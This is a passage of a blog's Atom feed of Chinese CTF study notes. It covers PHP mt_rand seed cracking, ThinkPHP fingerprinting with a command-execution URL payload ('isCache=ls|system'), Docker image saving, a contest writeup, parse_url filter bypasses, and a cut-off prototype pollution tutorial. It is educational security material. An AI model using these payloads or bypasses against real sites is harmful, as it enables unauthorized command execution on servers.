alt="image-20241116165703575"></p><p>str1变量的值就是PHP代码中的$str的值，str2变量的值就是PHP代码中 输出的$password的前10个字节。这段代码的基本作用就是将$password 中的前10个字节(即变量str2)进行定位，得到其在str1中的具体下标 位置，然后按照具体格式输出。以str2中的第一个字母A为例，字母A 在变量str1中的下标是36(字符串下标从0开始)</p><p>将输出的字符输入到编译好的php_mt_seed工具中，具体指令如下:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165734372.png" alt="image-20241116165734372"></p><p>最终我们找到一个随机数种子 19290735(PHP7.1)。在这一步需要注意的是，mt_rand()函数本身确 实存在问题，但是根据PHP版本的不同，其生成的随机数会略有区别。 所以，在实际题目中一定要注意PHP版本问题，不能脱离PHP版本来做 题。</p><p>利用得到的随机数种子编写PHP脚本，如下所示:</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241116165751773.png" alt="image-20241116165751773"></p><p>尝试将该结果提交给服务端，即可成功得到flag。</p><p>本质上是因为mt_rand()函数的不安全性导致的。所以，我们需要明确 以下几点:</p><ol><li>mt_rand()函数的不安全性是考点的核心。</li></ol><p>2)要爆破随机数种子，首先需要得到mt_rand()函数生成的随机数序</p><p>列。</p><p>3)mt_rand()函数生成的随机数序列可能以不同的形式表现(例如生成 随机字符串)。</p><p>4)相同函数在不同的PHP版本(大版本)中的实现代码可能是不一样 的。例如，在PHP7和PHP5中，mt_rand()函数的实现算法是完全不同 的。</p><p>5)计算机中不存在真正的随机数，这是mt_rand()函数存在安全问题的 根本原因。</p>]]></content>
    
    
    <summary type="html">🥧随机数种子爆破</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3ngx1ng.github.io/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>tp漏洞</title>
    <link href="https://m3ngx1ng.github.io/posts/3b315222.html"/>
    <id>https://m3ngx1ng.github.io/posts/3b315222.html</id>
    <published>2024-11-24T16:00:00.000Z</published>
    <updated>2024-12-02T09:04:15.023Z</updated>
    
    <content type="html"><![CDATA[<h1>tp漏洞</h1><h2 id="一-识别tp框架-指纹">一-识别tp框架(指纹)</h2><h3 id="1-1-ioc判断">1.1 ioc判断</h3><p>/favicon.ico</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20516b1e8de85b6b95343771b66b44df.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125193711067.png" alt="image-20241125193711067"></p><h3 id="1-2报错">1.2报错</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1c8c509ef3f760f24376d38f6a7625c8.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3b4ccc2eacbbf6163c0ef584d7aeb544.png" alt="img"></p><p>或者 /index.php/index/index/1</p><h3 id="1-3错误传参">1.3错误传参</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/479046ae0c8bf91e2d32d17acc474db9.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebf2fd7c4ce6bf62b49083a7085bd599.png" alt="img"></p><h3 id="1-4特殊指纹出现logo">1.4特殊指纹出现logo</h3><p>/?c=4e5e5d7364f443e28fbf0d3ae744a59a</p><p>/4e5e5d7364f443e28fbf0d3ae744a59a</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3ddc4ccf08674da045f360091d24546e.png" alt="img"></p><p>p3.1和3.2版本</p><p>4e5e5d7364f443e28fbf0d3ae744a59a-index.html</p><h3 id="1-5-body特征">1.5 body特征</h3><p>body里有&quot;十年磨一剑&quot; 或者&quot;ThinkPHP&quot;</p><h3 id="1-6插件">1.6插件</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0684f3dbf50af3128a16c0a775d03eb4.png" alt="img"></p><h2 id="二、利用方法">二、利用方法</h2><p>数据通过竖线分开, 前面为参数, 后面为函数。例如：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cacheTime=<span class="number">0</span>&amp;isCache=<span class="keyword">ls</span>|<span class="built_in">system</span>  </span><br><span class="line">/<span class="built_in">index</span>.php/?cacheTime=<span class="number">0</span>&amp;isCache=<span class="keyword">ls</span>|<span class="built_in">system</span>   #上面不行就换下面</span><br></pre></td></tr></table></figure><p>根据 thinkphp 的路由规则：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于ThinkPHP存在两种路由规则，如下所示</span><br><span class="line"><span class="link">http://serverName/index.php/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line"><span class="link">http://serverName/index.php?s=/模块/控制器/操作/</span>[<span class="string">参数名/参数值...</span>]</span><br><span class="line">也可采用 index.php/a/b/c/$&#123;code&#125;一下形式。</span><br></pre></td></tr></table></figure><p>访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里。</p><p>所以一般要先加上路由路径。</p>]]></content>
    
    
    <summary type="html">🥧tp漏洞</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3ngx1ng.github.io/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>docker保存和打包镜像</title>
    <link href="https://m3ngx1ng.github.io/posts/5721bfe4.html"/>
    <id>https://m3ngx1ng.github.io/posts/5721bfe4.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T09:09:58.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="docker保存和打包镜像">docker保存和打包镜像</h2><p>作用：在现在容器镜像上保存镜像进行打包，在另一台服务上使用；或现有的容器安装了一些库，配置了开发环境，需要保存下载，下次加载后直接使用。</p><h4 id="1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）">1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><h4 id="1-2-接下来用commit参数进行保存镜像（精简版）">1.2 接下来用commit参数进行保存镜像（精简版）</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> commit  <span class="number">7</span>ca736d99653    yolov5:v6.<span class="number">2</span></span><br></pre></td></tr></table></figure><p>其中，7ca736d99653 是需要保存镜像的ID，刚才用docker ps -a 查询到的。</p><h2 id="打包tar">打包tar</h2><p>使用save参数进行打包，格式如：docker save -o  tar文件名称     镜像REPOSITORY:TAG</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o yolov5-v6.2.tar yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中yolov5:v6.2 是需要保存镜像的REPOSITORY、和TAG；也是上面保存的镜像名称。</p>]]></content>
    
    
    <summary type="html">🥧docker保存和打包镜像</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://m3ngx1ng.github.io/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>第八届强网杯青少赛wp</title>
    <link href="https://m3ngx1ng.github.io/posts/2cd096fe.html"/>
    <id>https://m3ngx1ng.github.io/posts/2cd096fe.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T09:26:18.622Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1>第八届强网杯青少赛wp</h1><h2 id="misc">misc</h2><h4 id="签到漫画">签到漫画</h4><blockquote><p>每个漫画的最后一张都是二维码的一部分，全部保存，然后拼在一起，扫描二维码出flag.。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155544679.png" alt="image-20241124155544679"></p><blockquote><p>flag{youthful_and_upward}</p></blockquote><h4 id="whitepic">whitepic</h4><blockquote><p>考点：gif图像</p></blockquote><blockquote><p>下载文件，没有后缀名，能用010editor打开</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155848111.png" alt="image-20241124155848111"></p><blockquote><p>根据文件头GIF89a，可以看出是个gif文件。直接使用gifsplitter分离帧数，在其中一帧找到flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160011013.png" alt="image-20241124160011013"></p><h4 id="问卷">问卷</h4><blockquote><p>你懂的</p></blockquote><h2 id="web">web</h2><h4 id="ezGetFlag">ezGetFlag</h4><blockquote><p>考点：http请求方式</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160230507.png" alt=""></p><blockquote><p>点击10次会出现提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160307890.png" alt="image-20241124160307890"></p><blockquote><p>直接抓包，修改请求方式，把GET改成POST就行了。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160446998.png" alt="image-20241124160446998"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160500182.png" alt="image-20241124160500182"></p><blockquote><p>flag{4efb5300-7885-40a9-bf2a-31bbd8ebef86}</p></blockquote><h4 id="ezFindShell">ezFindShell</h4><blockquote><p>考点：代码审计</p></blockquote><p>这题是赛后复现，所以可能不全</p><p>首先拿到一堆php文件，用seay审计</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223303421.png" alt="image-20241130223303421"></p><p>非常相似，当时比赛没找到漏洞，现在复现，全局搜索一下post</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223557289.png" alt="image-20241130223557289"></p><p>发现可用漏洞</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223624296.png" alt="image-20241130223624296"></p><p>array_filter() 函数用回调函数过滤数组中的元素。</p><p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p><p>将代码进行base64编码传上去应该就可利用该漏洞。</p>]]></content>
    
    
    <summary type="html">🥧第八届强网杯青少赛wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3ngx1ng.github.io/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>parse_url函数</title>
    <link href="https://m3ngx1ng.github.io/posts/f885edb3.html"/>
    <id>https://m3ngx1ng.github.io/posts/f885edb3.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T09:02:40.921Z</updated>
    
    <content type="html"><![CDATA[<p>parse_url函数<br>作用：parse_url — 解析 URL，返回其组成部分</p><p>mixed parse_url ( string $url [, int $component = -1 ] )<br>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p><p>参数：<br>url：要解析的 URL。无效字符将使用 _ 来替换。</p><p>component：<br>指定 PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、PHP_URL_QUERY 或 PHP_URL_FRAGMENT 的其中一个来获取 URL 中指定的部分的 string。 （除了指定为PHP_URL_PORT 后，将返回一个 integer 的值）。</p><p>对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DEMO</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里我们还输出了当前$url的PHP_URL_PATH 发现是 /path<br>那么如果我们这里把$url中的/path去掉 发现输出的则为 NULL</p><p>tips：parse_url()会把//认为是相对路径（5.4.7以前）<br>如果我们</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;//www.example.com/path?googleguy=googley&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 在 5.4.7 之前这会输出路径 &quot;//www.example.com/path&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2016asisctf的一道web题-DEMO1">2016asisctf的一道web题 DEMO1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$filter</span>=<span class="keyword">array</span>(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;qqqq&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$f</span>.<span class="string">&quot;/i&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;query&#x27;</span>]))</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Attack Detected&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8493b71d2534228680bc92134d48817d.png" alt="img"></p><p>这里query中的参数有aaa 被preg_match匹配到 所以拦截了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/260d79001d32b5306fb9f046839ee920.png" alt="img"></p><p>这里test.php前面加了一个/ 导致把test.php? 认为成了host 相对的来说 /aaa/xxx 也就成为了路径 这也可以说是一个绕过吧</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a6c48f242ca38058c92a1bc195e6c365.png" alt="img"></p><p>这里test.php前面再多加了一个/ 导致 严重不合格的 URL，parse_url() 返回FALSE 这个是通用的绕过方法</p>]]></content>
    
    
    <summary type="html">🥧parse_url函数</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3ngx1ng.github.io/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>深入理解 JavaScript Prototype 污染攻击</title>
    <link href="https://m3ngx1ng.github.io/posts/575ed4b2.html"/>
    <id>https://m3ngx1ng.github.io/posts/575ed4b2.html</id>
    <published>2024-11-23T16:00:00.000Z</published>
    <updated>2024-12-02T08:49:14.702Z</updated>
    
    <content type="html"><![CDATA[<h1>深入理解 JavaScript Prototype 污染攻击</h1><h2 id="1、prototype和-proto-分别是什么？">1、<code>prototype</code>和<code>__proto__</code>分别是什么？</h2><p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Foo()</span><br></pre></td></tr></table></figure><p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p><blockquote><p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p></blockquote><p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p><p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.png"><img src="https://www.leavesongs.com/media/attachment/2019/04/03/46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></a></p><p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p><p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__ <span class="operator">=</span><span class="operator">=</span> Foo.prototype</span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p><p>所以，总结一下：</p><ol><li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li><li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li></ol><h2 id="0x02-JavaScript原型链继承"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">0x02 JavaScript原型链继承</a></h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p><p>比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure><p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p><p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p><p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p><p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p><ol><li>每个构造函数(constructor)都有一个原型对象(prototype)</li><li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li><li>JavaScript使用prototype链实现继承机制</li></ol><h2 id="0x03-原型链污染是什么"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03">0x03 原型链污染是什么</a></h2><p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p><p>做个简单的实验：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line">let foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line">let zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(zoo.bar)</span><br></pre></td></tr></table></figure><p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p><p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = &#123;&#125;</code>，zoo对象自然也有一个bar属性了。</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><h2 id="0x04-哪些情况下原型链会被污染？"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x04">0x04 哪些情况下原型链会被污染？</a></h2><p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p><p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：</p><ul><li>对象merge</li><li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function <span class="keyword">merge</span>(target, source) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> <span class="keyword">key</span> <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">key</span> <span class="keyword">in</span> source &amp;&amp; <span class="keyword">key</span> <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="keyword">merge</span>(target[<span class="keyword">key</span>], source[<span class="keyword">key</span>])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[<span class="keyword">key</span>] = source[<span class="keyword">key</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p><p>我们用如下代码实验一下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 